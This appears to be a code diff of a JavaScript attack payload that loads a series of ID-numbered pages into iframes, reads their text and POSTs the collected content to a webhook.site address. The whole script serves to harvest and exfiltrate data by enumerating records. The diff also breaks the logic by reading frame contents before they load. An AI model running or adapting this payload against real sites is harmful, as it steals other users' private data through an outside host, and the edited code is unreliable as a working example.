@@ -4,36 +4,26 @@ const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
 
 function run(a = 2800, b = 2840) {
     let results = [];
-    let loadedCount = 0;
-    const total = b - a;
 
     for (let i = a; i < b; i++) {
         const iframe = document.createElement("iframe");
         iframe.src = TARGET + i;
 
-        iframe.onload = () => {
-            if (iframe.contentDocument) {
-                results.push({
-                    id: i,
-                    data: iframe.contentDocument.documentElement.textContent
-                });
-            }
-
-            loadedCount++;
-
-            if (loadedCount === total) {
-                fetch(WEBHOOK, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(results)
-                });
-
-                console.log("sent");
-            }
-        };
-
         document.documentElement.appendChild(iframe);
+
+        results.push({
+            id: i,
+            data: iframe.contentDocument ? iframe.contentDocument.documentElement.textContent : ""
+        });
     }
+
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(results)
+    });
+
+    console.log("sent");
 }
 
 run();
